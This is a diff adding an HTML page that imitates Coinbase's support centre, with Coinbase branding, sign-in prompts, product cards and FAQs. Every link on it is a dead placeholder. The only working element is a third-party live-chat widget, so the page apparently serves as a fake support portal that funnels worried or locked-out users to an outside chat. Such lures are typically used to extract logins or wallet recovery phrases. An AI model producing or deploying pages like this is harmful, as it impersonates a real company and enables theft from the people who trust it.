@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <title>Coinbase Wallet Support</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f9f9f9; color: #333; }
+    header, footer { background: white; padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #ddd; }
+    .logo { font-weight: bold; font-size: 1.5em; color: #0052ff; }
+    .header-controls { display: flex; gap: 15px; align-items: center; }
+    .btn-blue { background: #0052ff; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; }
+    .main { padding: 30px; }
+    .search-bar { display: flex; align-items: center; gap: 10px; margin-bottom: 40px; }
+    .search-bar input { padding: 10px; width: 100%; max-width: 500px; border: 1px solid #ccc; border-radius: 4px; }
+    .section-title { font-size: 1.8em; margin-bottom: 15px; }
+    .card, .faq-item { background: white; padding: 20px; border-radius: 6px; margin-bottom: 20px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
+    .card-content { max-width: 70%; }
+    .radio-card { display: flex; flex-direction: column; align-items: center; padding: 20px; background: white; border-radius: 6px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); width: 30%; margin: 10px; text-align: center; text-decoration: none; color: inherit; }
+    .radio-card i { font-size: 2em; margin-bottom: 10px; color: #0052ff; }
+    .radio-group { display: flex; flex-wrap: wrap; justify-content: space-between; gap: 20px; }
+    .quick-links { display: flex; flex-wrap: wrap; gap: 15px; margin-bottom: 30px; }
+    .quick-link { padding: 12px 18px; background: #e6f0ff; border-radius: 5px; text-decoration: none; color: #0052ff; font-weight: bold; display: inline-flex; align-items: center; gap: 8px; }
+    .newsletter { margin: 40px 0; padding: 30px; background: #eef5ff; border-radius: 6px; }
+    .newsletter input[type="email"] { padding: 10px; width: 250px; margin-right: 10px; border: 1px solid #ccc; border-radius: 4px; }
+    footer { padding: 30px; background: white; border-top: 1px solid #ddd; display: flex; flex-wrap: wrap; justify-content: space-between; }
+    .footer-column { width: 23%; margin-bottom: 20px; }
+    .footer-column h4 { margin-bottom: 10px; font-size: 1.1em; }
+    .footer-column ul { list-style: none; padding: 0; }
+    .footer-column ul li { margin-bottom: 8px; }
+    a { color: #0052ff; text-decoration: none; }
+    .status-indicator { font-weight: bold; color: green; }
+    @media (max-width: 768px) {
+      .radio-card { width: 100%; }
+      .footer-column { width: 100%; }
+    }
+  </style>
+<link rel="stylesheet" href="https://assets.chaport.com/assets/widget-86f6cd1b6bd94006a80f01c411bbc262.css"></head>
+<body>
+
+<!-- Header -->
+<header>
+  <div class="logo">coinbase</div>
+  <div class="header-controls">
+    <button class="btn-blue">Sign in</button>
+    <span><i class="fas fa-globe"></i> US</span>
+    <span><i class="fas fa-bars"></i></span>
+  </div>
+</header>
+
+<main class="main">
+
+  <!-- Search Bar -->
+  <div class="search-bar">
+    <i class="fas fa-search"></i>
+    <input type="text" placeholder="Search for issues">
+  </div>
+
+  <!-- Quick Access -->
+  <div class="quick-links">
+    <a href="#" class="quick-link"><i class="fas fa-lock"></i> Password Reset</a>
+    <a href="#" class="quick-link"><i class="fas fa-redo-alt"></i> Account Recovery</a>
+    <a href="#" class="quick-link"><i class="fas fa-shield-alt"></i> Security Tips</a>
+  </div>
+
+  <!-- Sign in for support -->
+  <section>
+    <div class="section-title">We’re here to help</div>
+    <div class="card">
+      <div class="card-content">
+        <h2>Sign in for support</h2>
+        <p>By signing in, you can quickly connect with our Support team.</p>
+        <button class="btn-blue">Sign in for support</button><br><br>
+<a href="#">Unable to sign in</a>
+      </div>
+      <div><i class="fas fa-arrow-right"></i></div>
+    </div>
+  </section>
+
+  <!-- Top Support Articles -->
+  <section>
+    <div class="card">
+      <h2><i class="fas fa-info-circle"></i> Top support articles</h2>
+      <p>
+        Review our <a href="#">top support articles</a> that address common scenarios.<br>
+        If you need more help, choose your product and connect with our Support team.
+      </p>
+    </div>
+  </section>
+
+  <!-- Support Options -->
+  <section>
+    <div class="card">
+      <h3>Suspicious activity?</h3>
+      <p>If you suspect your account has been compromised, you can call Coinbase Support to lock your account.</p>
+      <button class="btn-blue">Learn more</button>
+    </div>
+
+    <div class="card">
+      <h3>Need to speak to an agent?</h3>
+      <p>
+        Sign in, tell us about your issue, and connect with an agent.<br>
+        If you can’t log in, we’ll help troubleshoot here.
+      </p>
+      <button class="btn-blue">Sign in to speak with us</button>
+    </div>
+  </section>
+
+  <!-- Choose Product -->
+  <section>
+    <div class="section-title">Choose your product <span style="color:red">*</span></div>
+    <div class="radio-group">
+      <a href="#" class="radio-card">
+        <i class="fab fa-bitcoin"></i>
+        <strong>Coinbase</strong>
+        <p>Buy, sell, use, spend cryptocurrency, and borrow cash</p>
+      </a>
+      <a href="#" class="radio-card">
+        <i class="fas fa-chart-line"></i>
+        <strong>Coinbase Prime</strong>
+        <p>Cryptocurrency storage and trading for institutions</p>
+      </a>
+      <a href="#" class="radio-card">
+        <i class="fas fa-image"></i>
+        <strong>Coinbase NFT</strong>
+        <p>Discover, showcase, purchase, and create NFTs</p>
+      </a>
+      <a href="#" class="radio-card">
+        <i class="fas fa-wallet"></i>
+        <strong>Coinbase Wallet</strong>
+        <p>Store your own cryptocurrency</p>
+      </a>
+    </div>
+    <div class="radio-group">
+      <a href="#" class="radio-card">
+        <i class="fas fa-coins"></i>
+        <strong>Coinbase Commerce</strong>
+        <p>Accept cryptocurrency payments</p>
+      </a>
+      <a href="#" class="radio-card">
+        <i class="fas fa-cogs"></i>
+        <strong>Developer Platform</strong>
+        <p>Coinbase Developer Platform APIs and Services</p>
+      </a>
+      <a href="#" class="radio-card">
+        <i class="fas fa-credit-card"></i>
+        <strong>Coinbase Card</strong>
+        <p>Spend Crypto, Earn Crypto rewards</p>
+      </a>
+    </div>
+  </section>
+
+  <!-- FAQs -->
+  <section>
+    <div class="section-title">Frequently Asked Questions</div>
+    <div class="faq-item">
+      <strong>How do I reset my 2-step verification?</strong>
+      <p>Visit the 2FA help page and follow the verification steps. <a href="#">Learn more</a></p>
+    </div>
+    <div class="faq-item">
+      <strong>Can I recover funds sent to the wrong address?</strong>
+      <p>Unfortunately, crypto transactions are irreversible. <a href="#">Read about recovery options</a></p>
+    </div>
+  </section>
+
+
+
+  <!-- System Status -->
+  <p><strong>System Status:</strong> <span class="status-indicator">All systems operational</span></p>
+
+</main>
+
+<!-- Footer -->
+<footer>
+  <div class="footer-column">
+    <h4>Company</h4>
+    <ul>
+      <li><a href="#">About</a></li>
+      <li><a href="#">Careers</a></li>
+      <li><a href="#">Affiliates</a></li>
+      <li><a href="#">Blog</a></li>
+      <li><a href="#">Press</a></li>
+    </ul>
+  </div>
+  <div class="footer-column">
+    <h4>Learn</h4>
+    <ul>
+      <li><a href="#">Crypto Basics</a></li>
+      <li><a href="#">Market Updates</a></li>
+      <li><a href="#">Newsletter</a></li>
+<li><a href="#">Security Tips</a></li>
+    </ul>
+  </div>
+  <div class="footer-column">
+    <h4>Support</h4>
+    <ul>
+      <li><a href="#">Help Center</a></li>
+      <li><a href="#">Contact Us</a></li>
+      <li><a href="#">Account Access</a></li>
+      <li><a href="#">ID Verification</a></li>
+    </ul>
+  </div>
+  <div class="footer-column">
+    <h4>Products</h4>
+    <ul>
+      <li><a href="#">Wallet</a></li>
+      <li><a href="#">Card</a></li>
+      <li><a href="#">NFT</a></li>
+      <li><a href="#">Prime</a></li>
+    </ul>
+  </div>
+</footer>
+<script src="//code.jivosite.com/widget/aVy2oIwAjX" async></script>
+<!-- End of Chaport Live Chat code -->
